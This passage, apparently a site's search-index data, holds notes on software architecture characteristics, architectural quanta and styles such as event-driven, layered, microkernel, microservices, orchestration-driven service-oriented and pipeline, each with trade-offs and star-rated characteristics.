Ideally you make a list with definitions for your organization to align around the names, definitions, and their scope.\nHowever, below is a list of examples to help you get started. You can also see the ISO 25010 list for inspiration.\nTerm Category Definition/Example Availability Operational How long does the system need to be available ? (e.g. 99.9% up) Continuity Operational Disaster Recovery capability Performance Operational Response time Recoverability Operational Business continuity requirements (e.g. ISO27001) Reliability Operational Fail-safe? Mission critical in a way that it affects lives Robustness Operational Ability to handle errors and boundary conditions while running if the internet connection drops Scalability Operational Ability of the system to perform and operate as the number of users/requests increases Configurability Structural Ability for end users to change aspects of the software configuration Extensability Structural How important is it to plug new pieces of functionality in Installability Structural Ease of system installation on all necessary platforms Reuse Structural Ability to reuse common components across multiple products Localization Structural Support for multiple (human) languages Maintainability Structural How easy to apply changes and enhance the system Portability Structural Does the system need to run on more than one platform? Supportability Structural What level of technical support is needed by the application ? Upgradeability Structural Ability to easily upgrade from previous versions Accessability Cross-Cutting Access to all your users, including those with disabilities Archivability Cross-Cutting Will the data need to be archived or deleted after some time ? Authentication Cross-Cutting Security requirements to ensure users are who they say they are Authorization Cross-Cutting Ensure users can access only what they are allowed to access Legal Cross-Cutting GPDR ? Data protection ? Privacy Cross-Cutting Ability to hide transactions from internal company employees. Security Cross-Cutting Does the data need to be encrypted at-rest or in-transport ? Usability Cross-Cutting Level of training required for users to achieve their goals Identifying Characteristics # The aforementioned list is mostly about implicit architecture characteristics, there are at least 2 more ways to uncover architecture characteristics:\nExtract From Domain Concerns # Listen well to domain/business stakeholders and understand their concerns. Don\u0026rsquo;t mistake a single concern as one characteristic.\nDomain Concern Example Architecture Characteristics Merges \u0026amp; Acquisitions Interoperability, Scalability, adaptability, extensibility Time To Market Agility, Testability, Deployability User Satisfaction Performance, availability, Fault tolerance, testability, deployability, agility, security Competitive Advantage Agility, testability, deployability, scalability, availability, fault tolerance Time and Budget Simplicity, feasibility Extract From Requirements # Sometimes there are explicit requirements (e.g. min/max amount of users) or just from having a lot of domain knowledge. If you have a class registration system that is once per year used, for 24h, all students will need to use it. You probably only need to deal with a small peak, and further not worry about availability.\nMeasuring Characteristics (Governance) # Common problems around the definition of architectural characteristics:\nThey aren\u0026rsquo;t physics: Many characteristics have vague meanings. Wildly varying definitions: Within same organization, departments may disagree on the definition. Too Composite: Many characteristics comprise many other at smaller scale (e.g. agility =\u0026gt; modularity, deployability, testability) There are 3 types of measurements:\nOperational: Many characteristics have direct measurements. However many nuanced interpretations. The average response time can be for one team good enough, for the others the 1% that take 10 times longer are relevant to care about. Structural: Comprehensive metrics for internal code quality don\u0026rsquo;t yet exists. Some metrics and common tools do allow architects to address some critical aspects of code structure, albeit along narrow dimensions. A good example is cyclomatic complexity. Process: Some characteristics interest with software development processes. Agility may decompose into features as testability and deployability. Testability is measurable through code coverage tools. Governance is an important role of an Architect, negligence can lead to disastrous quality problems. Fitness functions are excellent to help with this.\nScope of Characteristics # When architects talk about scalability, generally that discussion is around the scalability of the entire system. That was a safe assumption a decade ago when everything was monolithic. With the advent of new architectural styles like microservices, the scope of architecture characteristics has narrowed considerably. When evaluating many operational architecture characteristics, an architect must consider dependent components outside the code based that will impact those characteristics.\nIn modern systems, architects define architecture characteristics at the quantum level rather than system level.\nArchitectural Quanta # To successfully design, analyze, and evolve software, developers must consider all the coupling points that could break. To identify these coupling points, consider the architecture quantum boundaries. So what is an architecture boundary?\nAn independently deployable artifact with high functional cohesion and synchronous connascence.\nIndependently Deployable: Includes necessary components to function independently from other parts of the architecture. A database used by an application, is a part of the quantum, because without the database, the application wont work. High Functional Cohesion: How well the contained code is unified in purpose. This implies that an architecture quantum does something purposeful. The bounded context from DDD is a good example of high functional cohesion. Synchronous Connascence: Implies synchronous communication within an application context or between distributed services tha form this architecture quantum. Connascence is a indication of modularity. Resources # Fundamentals of Software Architecture | Chapters 4, 5, 6, 7 Tolerance for Imperfection "},{"id":67,"href":"/software-architecture/architecture-styles/ball-of-mud/","title":"Ball of Mud","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Ball Of Mud # Description # The Ball Of Mud is rather placeholder for the lack of architecture, resulting in a mess, lack of consistent application of patterns and a bunch of anti patterns. Spaghetti code call it, a ball of hair. Just plain chaos. This is usually the result due to lack of planning, vision and/or governance. It goes without saying that one never should aim for this architectural style.\nName originates from Brian Foote and Joseph Yoder\u0026rsquo;s 1997 paper of the same name.\nCharacteristics # Characteristic/Name Ball Of Mud Monolithic/Distributed Monolithic Partitioning Type ? Number of quanta 1 Deployability â­ Elasticity â­ Evolutionary â­ Fault Tolerance â­ Modularity â­ Overall cost â­ Performance â­ Reliability â­ Scalability â­ Simplicity â­ Testability â­ Resources # Brian Foote and Joseph Yoder\u0026rsquo;s 1997 paper "},{"id":68,"href":"/software-architecture/architecture-styles/event-driven/","title":"Event Driven","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Event-Driven # Description # Made up of decoupled event processing components that asynchronously receive and process events. This architectural style can be used standalone or embedded with other architectural styles.\nThere is a difference between the architectural style of pure \u0026ldquo;Event-Driven\u0026rdquo; and events and event sourcing in general. Therefore, for more information specific to events and not the specific architectural style. See Integration Architecture \u0026gt; events.\nRequest-Based \u0026amp; Event-Based # Majority of processes in any architectural style are request-driven, using the request-based model. In the event-based model, systems react to an event that happens. We are inverting the responsibility for systems to act accordingly.\nIf we think about it, the event-model is all around us in nature and physics. When you throw a ball against the wall, the ball moves through the air as reaction to the event of force being exercised on the ball. We could mistake the idea that we \u0026ldquo;tell the ball\u0026rdquo; what to do, but rather through our understanding of physics (or experience) we know that the ball will respond with flying through the air, if we put pressure on it. Actually, in nature there is little that is genuinely \u0026ldquo;request-based\u0026rdquo;, even a \u0026ldquo;response\u0026rdquo; is a reaction to an event that indicated a \u0026ldquo;request\u0026rdquo;. The philosophical part aside, the request-based model demands a synchronous interaction, event-based is intentionally asynchronous.\nTopologies # Most common topologies are Broker and Mediator topology. They architecture characteristics and implementation strategy differs between these topologies, therefore it is important to understand the difference between them.\nBroker Topology (Choreography Pattern) # This is also known as The Choreography Pattern.\nUsed when you require a high degree of responsiveness and dynamic control over the processing of an event.\nThis topology has no central event mediator, messages flow across the event processor components in a chain-like broadcasting fashion. Works great when you have relative simple event processing flow that doesn\u0026rsquo;t require event orchestration and coordination There are 4 primary architecture components:\nInitiating Event: Event that starts the entire flow. This event gets send to the Event Broker. Example: An order was placed advertised with \u0026ldquo;PlaceOrder\u0026rdquo; event. Event Broker: Receives events and forwards these events based on if any Event Processors are listening and interested for the given even (e,g. through pub/sub). Example: \u0026ldquo;OrderPlaced\u0026rdquo; event forwarded to \u0026ldquo;OrderPlacement\u0026rdquo; Technology examples: RabbitMQ, ActiveMQ, HornetQ Event Processor: Accepts an incoming event that it cares about and performs actions/business logic specific to that event. Once the processing is done, the results/output/actions are advertised asynchronously with a Processing Event. Event processors are highly decoupled and independent of each other. Example: \u0026ldquo;OrderPlacement\u0026rdquo; processes PlaceOrder event into an order. Processing Event: Example: \u0026ldquo;order-created\u0026rdquo; Event Processors advertise to the rest of the system the results of their processing as Processing events.\nSee Example Flow Diagram\nChallenges # No control over the overall workflow associated with the initiating event. Everything is dynamic, based on various conditions, no one in the system really knows when the entire Business activity has been completed or not. Error Handling is hard, there is no implicit monitoring if a business activity has failed, or if a failure has occurred. Other event processes or not aware of a crash in a certain part of the system. The ability to restart a business transaction (recoverability) is also something not supported with this topology. Requiring often manual intervention. Mediator Topology (Orchestration Pattern) # This is also known as The Orchestration Pattern.\nUsed when you require control over the workflow of an event process. Partially addresses the shortcomings of the broker topology.\nThere are 5 primary architecture components:\nInitiating Event: Event that starts the entire flow. This is sent to an event queue. Event Queue: This queue keeps track of all the initiating events. Ready for the Event Mediator to consume. Event Mediator: The central component in this topology/pattern. This accepts events from the initial event queue. The event mediator only knows the steps involved in processing the event and therefore generates corresponding processing events that are sent to dedicated event channels. Event Channels: Dedicated event channels (usually queues) in a point-to-point fashion between the event mediator and the event processors. Event Processors: Event processor listens to dedicated event channels, processes the event, and usually will respond back to the mediator to inform failure/success. Event Processors do not advertise to the rest of the system, and only communicates back to the event mediator. Therefore \u0026ldquo;events\u0026rdquo; in this topology are more like \u0026ldquo;commands\u0026rdquo;.\nIt is common that there are multiple event mediators, each event mediator scoped to a specific domain, business process, or other logical grouping.\nEvent Mediator Types # Mediator Delegation Model: One advice is to use a simple event mediator, and based on the contents of the event, it might forward this to a more complex event mediator if warranted. Therefore one must understand well the types of events being processed to choose the right type of event mediator.\nSimple Event Mediator: Simple error handling + orchestration: Apache Camel, Mule ESB, Spring Integration, or self written Hard Event Mediator: Complex conditional processing and multiple dynamic paths with complex error handling: Apache ODE, Oracle BPEL (Business Process Execution Language) Complex Event Mediator: Long running transactions that required manual (human) interaction: BPM (Business Process Management) engine such as jBPM Examples\nExample of combined mediators types: Overview Example of combined mediators types: Step 1 Example of combined mediators types: Step 2 Example of combined mediators types: Step 3 Example of combined mediators types: Step 4 Example of combined mediators types: Step 5 Challenges # It is very difficult to declaratively model the dynamic processing that occurs within a complex event flow. THerefore many workflows within the mediator only handle the general processing, a hybrid model combining mediator and broker topology is used to address the dynamic nature of complex event processing. Event processors can easily be scaled, the event meditator less so, occasionally causing bottleneck problems. Event processors care not as highly decoupled compared to the broker topology. Performance is not as good due to the mediator controlling nature. Comparison # Trade off between workflow control and error handling capability versus high performance and scalability. Performance and scalability are good in general for event-driven architecture, the broker topology does is slightly better than the mediator topology.\nBroker/Choreography Mediator/Orchestration Advantages Highly decoupled events processorsHigh scalabilityHigh ResponsivenessHigh PerformanceHigh fault tolerance Workflow controlError handlingRecoverabilityRestart capabilitiesBetter data consistency Disadvantages Workflow controlError handlingRecoverabilityRestart capabilitiesData inconsistency More coupling of event processorsLower ScalabilityLower performanceLower fault toleranceModeling complex workflows When (NOT) To Use # A key question that emerges is using \u0026ldquo;event-driven\u0026rdquo; versus \u0026ldquo;request-reply\u0026rdquo; based models.\nEvent-Driven: Recommended for flexible, action-based events that require high levels of responsiveness and scale, with complex and dynamic user processing.\nRequest-Based: Recommended for well-structured, data-driven (e.g. fetch user profile) requests when certainty and control over the workflow is needed.\nAdvantages over request-based\nBetter response to dynamic user content Better scalability and elasticity Better agility and change management Better adaptability and extensibility Better responsiveness and performance Better real-time decision making Better reaction of situational awareness Trade-offs\nOnly supports eventual consistency Less control over processing flow Less certainty over outcome of event flow Difficult to test and debugs Considerations # Changes to a particular domain usually impact many event processors, mediators, and other messaging artifacts, hence why event-driven architecture is not domain partitioned.\nAsync Error Handling # A key characteristic is the asynchronous nature of event-driven architectures. With a simple \u0026ldquo;acknowledgement\u0026rdquo; one can create a responsive experience to the end user without having to fix the performant nature if it was request-based. Working asynchronous does come with a challenge, which is error handling. Error handling in an async environment is more challenging thant with request-based. Cause if an error happens, how do you get back to the end user to inform them and take proper action?\nThe Workflow Event Pattern (see Reactive Architecture) is one way to address error handling in asynchronous setting which addresses resiliency and responsiveness concerns. It works like the following:\nAn Event Product sends an initiating event to the Event channel. Initiating event is accepted by the Event Consumer. The Event Consumer spots an error/issue/excepton with the event and forwards without thinking much about it to the event channel that directs events to the workflow processor. THe Workflow processor can accept the faulty event and then use either some logic/AI to modify the event and sends it back to the original event channel for re-processing. Alternatively the Workflow processor can send the event to a dashboard operated by end user or internal user for manual review/modifications. Once modified, the event can be channeled back to the original event channel for re-processing. IMPORTANT: This pattern will result in some out-of-order events. Take necessary design/implementation considerations to deal with this. See Building Event-Driven Microservices: Chapter 6 Deterministic Streeam Processing Preventing Data Loss # Data loss is when a message is dropped or never makes it to its final destination. In a typical scenario there are 3 areas of potential data loss.\nIssue 1: An Event Processor fails to get a message to the queue/event channel. Solution: Use persistent message queues and synchronous send. Also known as guaranteed delivery. Issue 2: An Event Processor de-queues the next message and crashes before processing it. Solution: Use client acknowledgement mode instead of auto acknowledge mode which dictates that the client must first acknowledge that it was received before dropping the message. Issue 3: An Event Processor is unable to persist some data related to a message to a database. Solution: Use ACID properties for DB communication and Last Participant Support (LPS) for removing the message from the persisted queue by acknowledging that the processing has been completed. Solution Diagram\nBroadcast Capabilities # Another unique characteristic of event-driven architecture style is the ability to broadcast knowledge/events/messages without the need to know who is listening which is great for decoupling.\nSolution Diagram\nRequest-Reply # Sometimes synchronous communication is required which requires request-reply patterns. This is accomplished with request-reply messaging (aka psydosynchronous communication). Note that there 2 popular ways to implement this by using Correlation ID or temporary queues.\nSolution Diagram\nHybrid Event-Driven Architectures # Event-driven architectural style can be used in conjunction with other architectural styles. Adding event-driven to any architectural style helps remove bottlenecks, provides a back pressure point in the event requests getting backed up, and provides a level of user responsiveness not found in other architectural styles.\nExamples:\nEvent-Driven + Microservices Leverages Event-Driven for data pumps, async data sending, programmatic scalability Event-Driven + Space-Based Leverages Event-Driven for data pumps, async data sending, programmatic scalability (processing units) Event-Driven + Microkernel Event-Driven + Pipeline Versioning # See Versioning\nCharacteristics # Characteristic Rating Partitioning Type Technical Number of quanta 1 to many Deployability â­â­â­ Elasticity â­â­â­ Evolutionary â­â­â­â­â­ Fault Tolerance â­â­â­â­â­ Modularity â­â­â­â­ Overall cost â­â­â­ Performance â­â­â­â­â­ Reliability â­â­â­ Scalability â­â­â­â­â­ Simplicity â­ Testability â­â­ Resources # Building Event-Driven Microservices: Leveraging Organizational Data at Scale Fundamentals of Software Architecture Reactive Manifesto What is Event Modeling "},{"id":69,"href":"/software-architecture/architecture-styles/layered/","title":"Layered","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Layered # Alternative names: n-tier architecture\nDescription # When we talk about \u0026ldquo;A monolith\u0026rdquo; most people will be referring to the layered architecture style. Although not entirely wrong, there are some other architectural styles which are categorized as monolith. See the architectural styles overview for more.\nThe layered approach is perfect for small, simple applications like web applications. Code is partitioned from a technical view. All code of the presentation layer goes into the presentation layer, disregarding the domain or entity it relates to.\nComponents within the layered architecture style are organized logical horizontal layers, each layer performing a specific role within the application. The amount of layers is not fixed, but 3 or 4 tiers are most common. It is important that each boundary of each layer is respected. Each layer has a distinct responsibility and role. Following the separation of concerns.\nOpen/Closed Layers # As a request travels through the system and its layers, each layer can be either open or closed:\nThe request cannot skip Closed layers. See Diagram The request can skip Open layers. See Diagram If you want to avoid open layers, you can move shared components in the relevant layer. So the top layer can then call any component or shared component in that underlying layer (Diagram)\nPhysical Separation # Layers can be physically separated (separated binaries, DLLs, JARs) but don\u0026rsquo;t have to. The physically separations can be done in various combinations (e.g. Business Layer placed in the same DLL as the Persistence Layer). However a phsyicall group should only contain layers which are adjacent to each other. You would never put the Presentation Layer and Database Layer in one physical component while putting the Business and Persistence Layer outside. Examples of different Physical seperation\nWhen To Use # Starting point when its not known yet which architectural style eventually will be used. Very tight budget or time constraints. Use it for a service or (web) application that has a very narrow and clear domain or responsibility. A micro-service style architecture could use the layered style within each individual micro-service. Many developers are familiar with it. When NOT To Use # When the domain of the system is very wide in scope. Considerations # Physical layering can exist in numerous combinations. Each layer has a distinct responsibility and role. Following the separation of concerns. A layer can only call the next layer underneath itself. No skipping layers. A request travels from top to bottom the response the other way up. Layers of isolation, changes in a single layer should have no impact or little on the other layers. Anti-Pattern: Architecture Sinkhole # When a request travels through all the layers and back up without any additional business logic. Let\u0026rsquo;s say you want to fetch a user profile, the request travels through all the 4 layers to the database, fetches the user profile and just returns that model all the way up without business logic, transformation, aggregate, or calculation. This anti-pattern will manifest a few times, but should not grow out of control. Reason why this can be bad, is that it might result in unnecessary memory and compute resources. Therefore, one can consider opening up all layers. Trade-off of that is that change will be harder to manage.\nTIP: Use 80/20, only 20% of request should pass through sinkhole, if 80% of request pass through the sinkhole, maybe consider another architecture style.\nCharacteristics # Characteristic Rating Monolithic/Distributed Monolithic Partitioning Type Technical Number of quanta 1 Deployability â­ Elasticity â­ Evolutionary â­ Fault Tolerance â­ Modularity â­ Overall cost â­â­â­â­â­ Performance â­â­ Reliability â­â­â­ Scalability â­ Simplicity â­â­â­â­â­ Testability â­â­ Resources # None\n"},{"id":70,"href":"/software-architecture/architecture-styles/microkernel/","title":"Microkernel","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Microkernel # Alternative names: plug-in architecture\nDescription # A natural fit for product applications that one can download and install as a single (monolithic) installation, but also used in many non-product business applications. Some programming frameworks or programming tools tend to use this also.\nThere are 2 components, the core system and the plug-in components. All application logic is divided between independent plug-in components and the basic core system, providing extensibility, adaptability, and isolation of application features and custom processing logic.\nA good example is the Visual Studio Code IDE, a core system that delivers basic functionality, but can be extended with various plugins. The idea is to have a system that delivers a basic functionality, but it can be extended, while keeping the core clean. In modern media it might be referred to as a \u0026ldquo;clean core\u0026rdquo;.\nPlug-ins can be shipped, modified, released at another release frequency than the core system and those plug-ins can be developed, maintained, and published by the end user itself or 3th parties. Logic is Nicely isolated in plugins which allows for a nice separation of concern.\nCore System # This contains the minimum functionality to run the system. Or one could also call it \u0026ldquo;the happy path\u0026rdquo; through the application without any customer or special logic. The Core System naturally can use another architectural style for its internal structure. Usually a layered style architecture.\nCore System Design Examples\nUser Interface # The presentation layer can be embedded in the core system or implemented as a separate layer, or have a microkernel architecture on it\u0026rsquo;s own.\nPresentation Layer Design Examples\nPlug-in Components # Standalone, independent components containing specialized processing, additional features, and custom code to enhance or extend the core system. Highly volatile code can be separately developed, designed, tested, and released without touching the core system.\nIdeally, plug-ins are independent from each other.\nPlugins can be distributed as JAR, DLL, or similar artifacts based on the technology used for the core system. Based on desired characteristics, plug-ins are compile-based or runtime-based. Other alternatives are possible like REST or messaging as communication channel between the plug-in and core system.\nHowever, when opting for REST/messaging, you are looking more at a distributed architecture, therefore you might want to consider other distributed architecture styles for your solution.\nPlug-in Example 1 Plug-in Example 2 Plug-in Rest Example\nData Storage # It is not common, and maybe also not desirable for plug-ins to use the core system database for storage. Else a strong coupling between the core system and the plug-in would emerge. A plug-in, to respect its independence and isolation, should have it\u0026rsquo;s own data store.\nData Store Diagram\nRegistry # The core system needs to know which plug-in components are available and how to get to them. Hence, the core system must have some \u0026ldquo;registry\u0026rdquo; that keeps track of these things.\nContracts # Clear contracts are required for being able to communicate between the core system and the plug-ins. These can be implemented as XML, JSON, or actual objects. Keep data contract evolution in consideration. Meaning, in case these contracts change over time as the core system might change to support new features or deprecate old.\nWhen To Use # When creating software, or development tools that have a need for high extendability. IDE\u0026rsquo;s, Build Tools, Jenkins, Jira, Frameworks, browsers When creating a product-based software that want\u0026rsquo;s to allow an ecosystem of 3th party developers to extend your product or tool. Large Business applications could benefit also from this, see ERP software. E.g. special plugins when you need to comply with special regulation, etc. When NOT To Use # Focus on the few areas where this is applicable. If not of the above meet your use cased or has similarities, you probably don\u0026rsquo;t want to consider this architectural style.\nConsiderations # None\nCharacteristics # Characteristic Rating Partitioning Type Domain \u0026amp; Technical Number of quanta 1 Deployability â­â­â­ Elasticity â­ Evolutionary â­â­â­ Fault Tolerance â­ Modularity â­â­â­ Overall cost â­â­â­â­â­ Performance â­â­â­ Reliability â­â­â­ Scalability â­ Simplicity â­â­â­â­ Testability â­â­â­ Resources # None\n"},{"id":71,"href":"/software-architecture/architecture-styles/microservices/","title":"Microservices","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Microservices # Description # Was named and use popularized by a blog post from Martin Fowler and James Lewis. The microservices style is heavily inspired on Domain-Driven-Design (DDD). The concept of Bounded Context (from DDD) was a decisive inspiration, which represents a decoupling style. The goal of microservices is high decoupling, physically modeling the logical notion of bounded context.\nThe driving philosophy of microservices is the notion of bounded context: each service models a domain or a workflow.\nTopology # We create single-purpose services that implement a bounded context. Each service is expected to include all necessary parts to operate independently, including databases and other dependent components.\nDistributed # Each service runs its own process, originally implying its own hardware. Virtualization, Containers and infrastructure automation made it possible to separate these much further compared to a single application server (e.g Websphere, Tomcat, \u0026hellip;) that struggles with multi-tenancy concerns for bigger organizations, like improper isolation between shared applications. Each services having its own process solves the issues introduced by shared application servers. Microservice style would not have been realistic without trust in OSS (low cost), introduction of virtualization, containers and infrastructure automation tools. Granularity # Finding the correct granularity for services is a core challenge. Making them too small, results often in communication (coupling) with many other services to do useful work. Some developers might take the term \u0026ldquo;microservices\u0026rdquo; as a commandment. As Martin Fowler said \u0026ldquo;The term microservice is a label, not a description\u0026rdquo;. Guidelines to help find appropriate boundaries: Purpose: Ideally each microservice should be extremely functionally cohesive, contributing one significant behavior on behalf of the overall application. Transactions: Bounded contexts are business workflows, and often the entities that need to cooperate in a transaction show architects a good service boundary. Transactions cause problems in distributed architectures, so if you can design your system to avoid transactions across services, you\u0026rsquo;ll generate better designs. Choreography: If you build services with excellent domain isolation, yet require extensive communication to function, consider bundling these services back int a larger service to avoid the communication overhead. This keeps microservices from becoming unnecessary small. Data Isolation: See \u0026ldquo;Data Isolation\u0026rdquo;. Iteration is key, iteration is the only way to ensure good service design. Refine! Data Isolation # Bounded contexts drive isolation, including the data. Microservices kills any coupling via shared databases or shared schemas used for integration. Don\u0026rsquo;t model based on the \u0026ldquo;Entity\u0026rdquo;, known as the \u0026ldquo;Entity Trap\u0026rdquo;, but I personally like to name it entity-driven-design. There are no various sources, each with their source of truth of a certain domain. In microservices, joining data of their respective source of truths is challenging, as all the data might not live in the same bounded context. Solve this either via Communicating with various bounded contexts to retrieve the data. Data replication or caching to distribute information. This isolation can create headaches to aggregate information, but the trade off is freedom in being able to chose the right tool, based on type of storage and related factors (Document database, Graph Database, \u0026hellip;) while other teams are not affected. API Layer # The API layer is optional, but sits between the Consumers of the system, which is a good location for lots of operational logic/tasks. The API layer should not be used for mediator/orchestration, that belongs in the bounded context! Mediators is \u0026ldquo;technical\u0026rdquo; partitioning, remember, it\u0026rsquo;s all about bounded contexts here. Operational Reuse # Microservices prefer duplication over reuse, to avoid coupling. However, some parts, like operational components (e.g. monitoring, logging, circuit breakers,\u0026hellip;) could really benefit from coupling. Even when using distinct bounded contexts, there will be similarities, especially from operational aspect.\nThe Sidecar Pattern offers a solution to this problem. Reusable components can be located in this sidecar and independently maintained by other teams (e.g. Infrastructure Teams). This pattern is very popular in service mesh. This patterns creates a consistent operational interface across all microservices. This is a part of thinking about creating a \u0026ldquo;platform\u0026rdquo;.\nSidecar Diagram\nFrontends # It is common to see a single (monolithic) user interface that talks to a microservice architecture. However, ideally the frontend is follows also the same design philosophy of microservices and we would expect to see micro frontends. Micro frontends exist, however due to practicalities and the novelty of the concept it is not so mainstream. However, we do expect further adoption.\nMonolithic Frontend Diagram Micro Frontend Diagram Communication # Finding the correct communication channel helps keeping services decoupled, yet coordinated in a useful way.\nSynchronous: Caller waits for the response from the callee. Microservices typically uses protocol-aware heterogeneous interoperability: Protocol Aware: There is no centralized integration hub to avoid strong coupling, but standardize how which protocols are used. Heterogenous: Every service can be in an entire different technology, so the protocol must support polyglot environments. Interoperability: Services calling one another. Asynchronous: Caller doesn\u0026rsquo;t wait for the response from the callee, but might come back at a later point. Common to use messaging and events. Event-driven architecture style is very often combined with microservices style to accommodate asynchronous communication. Choreography and Orchestration # Since we can use the event-driven style in conjunction with the microservices style, we can use the Broker/Choreography pattern as natural fit, cause of it\u0026rsquo;s highly decoupled nature. Allowing for decoupling between services. When there is a need for mediator/orchestration pattern, you can create a microservice with the sole responsibility to act as a mediator for the given bounded context. To be clear, you should not make a \u0026ldquo;mediator\u0026rdquo; microservices that is reused as \u0026ldquo;the mediator microservice\u0026rdquo; for any need for a mediator. Note that in microservices we can have choreography and orchestration using request-based and event-based communication. But many of the same principles, challenges, and benefits for each pattern apply for request-based and event-based implementations. Examples being error handling, workflow control, visibility, testing and recoverability. Diagrams:\nChoreography Simple Example Choreography Complex Example Orchestration Simple Example Orchestration Complex Example Transactions and sages # Don\u0026rsquo;t do transactions in microservices, fix granularity instead! See the \u0026ldquo;Granularity\u0026rdquo;. However, exceptions do exist, when they do, patterns exists with serious trade-offs.\nA popular distributed transactional pattern in microservices is the saga pattern. In this pattern a service acts a service using the mediator/orchestration pattern. The drawback on this is, when a single step in the transaction fails, all previous steps must be informed to cancel the step or execute a compensating action.\nThis style of transactional coordination is called Compensating Transaction Framework. The complexity of this and all challenges to implement this (especially undo actions) makes it less than desirable. Where possible, try to avoid cross service transactions all together and rethink your bounded contexts.\nDiagrams:\nSaga Default Saga Compensating Transactions Nuggets Of Wisdom # The best way to think about microservices is not by defining the size, but rather by determining the purpose.\nSource: Strategic Monoliths and Microservices - Driving Innovation Using Purposeful Architecture When To Use # When you desired high decoupling, so teams can move independently, at their own pace. Works well for really large organizations, where it is important to scale, make it reliable, but maintain speed of delivery. When NOT To Use # When cost is a serious concern for skills, engineers, and infrastructure. When performance is key. Considerations # Performance is often a negative side effect of the distributed nature. Network calls take longer, security verification at multiple points. Use of transactions across service boundaries is advised against. Determining the granularity of services is the key to success. New developments in automation and operations constantly reduce the overall cost for operating and hosting a microservice architecture. However, for smaller engineering teams usually is not reasonable. Characteristics # Characteristic Rating Partitioning Type Domain Number of quanta One to many Deployability â­â­â­â­ Elasticity â­â­â­â­â­ Evolutionary â­â­â­â­â­ Fault Tolerance â­â­â­â­ Modularity â­â­â­â­â­ Overall cost â­ Performance â­â­ Reliability â­â­â­â­ Scalability â­â­â­â­â­ Simplicity â­ Testability â­â­â­â­ Resources # How To Choose Microservice boundaries Martin Fowler on Microservices Fundamentals of Software Architecture "},{"id":72,"href":"/software-architecture/architecture-styles/orchestration-driven-service-oriented/","title":"Orchestration Driven Service Oriented","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Orchestration-Driven Service-Oriented # Description # Topology # Business Services: Sit on top of the architecture and are the entry point. These services did not contain code, just input, output, and sometimes schema information. Examples: ExecuteTrade, PlaceOrder (\u0026ldquo;Are we in the business of\u0026hellip;\u0026rdquo; as guiding principle) Enterprise Services: Fine-grained, shared implementations. Highly specialized atomic building blocks for the coarse-grained business services. These are tied together via the orchestration engine. Given a good collection of reusable enterprise services, one could easily change any business process. Composition was the goal. Examples: CreateCustomer, CalculateQuote Concerns: Dynamic nature of reality defies these attempts (Business Components are not static, solutions change, markets change, technologies change) Application Services: One-off, single-implementations, a service that would be used only once. So you don\u0026rsquo;t invest on making it reusable. Examples: GeoLocationService Infrastructure Services: Operational services like monitoring, logging and such. Orchestration Engine: Heart of the architecture. Stitching business service implementations together using orchestration of the Enterprise Services basically. The database usually was one shared one. This acts an an integration hub. Message Flow: All requests flow through the orchestration engine, cause the logic of the architecture lives here. Why It\u0026rsquo;s bad # This is a historical anti-pattern architectural style which is worth documenting as one might find these in the wild. It helps to understand historically why the emerged, why they were made, and why it made sense at that point in time. We can also draw some insights from this.\nThis style of service-oriented architecture appeared just as companies were becoming enterprises in the late 1990s: merging with smaller companies, growing at a breakneck pace, and requiring more sophisticated IT to accommodate this growth. Computing resources were scarce, precious, and commercial. Distributed computing had just become possible and necessary, and many companies needed the variable scalability and other beneficial characteristics.\nExternal drivers forced architects towards distributed architects with significant constraints. OSS was not properly accepted by enterprise, OS\u0026rsquo;s and licenses were expensive. Due to the insane pricing, architects were forced to reuse anything. Reuse became the dominant philosophy in this architecture. This extensive reuse philosophy and technical partitioning results in strong coupling which made change excruciating over time.\nWhen a team builds a system primarily around reuse, they also incur a huge amount of coupling between components. By reusing and centralizing everything, domains became bloated. A \u0026ldquo;entity-driven-design\u0026rdquo; approach emerged, where the CustomerProfile service would contains also the DrivingLicenseInfo while 9/10 the business services would not care about such information. However this DrivingLicenseInfo exposed to all other services. So the size and the technical nature of partitioning cause strong coupling across the entire architecture.\nReuse Example 1 Reuse Example 2\nThis architecture thought us, that a extreme focus on technical partitioning and reuse does not scale.\nWhen To Use # Never\nWhen NOT To Use # This always applies, do not use it.\nConsiderations # Characteristics # Characteristic Rating Partitioning Type Technical Number of quanta 1 Deployability â­ Elasticity â­â­â­ Evolutionary â­ Fault Tolerance â­â­â­ Modularity â­â­â­ Overall cost â­ Performance â­â­ Reliability â­â­ Scalability â­â­â­â­ Simplicity â­ Testability â­ Resources # None\n"},{"id":73,"href":"/software-architecture/architecture-styles/pipeline/","title":"Pipeline","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Pipeline # Alternative names: Pipes and filters\nDescription # Known as the underlying principle behind Unix terminal shell languages, those who dabble in functional programming will also see parallel\u0026rsquo;s. MapReduce is also a popular concept following this style. An entire process is built up from pipes and filters to deliver a certain functionality.\nThe power of composition is key in this architectural style.\nSee Example\nPipes \u0026amp; Filters # Pipes: Communication channel between filters. Usually unidirectional and point-to-point. Any type of data can be passed on, but small parts are favoured for high performance. Filters: Self-contained, independent, generally stateless pieces of code that perform a single task (responsibility). A composition of the logic should be done by a sequence of filters. There are 4 types: Producer: Starting point of a process. (AKA the \u0026ldquo;source\u0026rdquo;) Transformer: Takes input and transforms the input from the upstream pipe in some way and forwards it to the downstream pipe. A map in functional programming. Tester: Takes input from the upstream pipe and tests certain criteria (e.g. business logic), optionally producing output on the downstream pipe. A reduce in functional programming. Consumer: End of the process pipeline. The final result can be persisted or displayed. When To Use # When there is one-way data processing. For data pipelines or event pipelines such as ETL (Extract, Transform, and Load) for data warehousing and analytics. Orchestration of processes. When NOT To Use # By default don\u0026rsquo;t use it, unless the \u0026ldquo;reasons to use\u0026rdquo; are clearly met.\nConsiderations # This is still a monolithic style, so it comes with all the flaws of monolithic architectures.\nCharacteristics # Characteristic Rating Partitioning Type Technical Number of quanta 1 Deployability â­â­ Elasticity â­ Evolutionary â­â­â­ Fault Tolerance â­ Modularity â­â­â­ Overall cost â­â­â­â­â­ Performance â­â­ Reliability â­â­â­ Scalability â­ Simplicity â­â­â­â­â­ Testability â­â­â­ Resources # More shell, less egg "},{"id":74,"href":"/software-architecture/architecture-styles/readme/","title":"Readme","section":"Software Architecture","content":" Architecture Styles # Architecture styles can be use for the 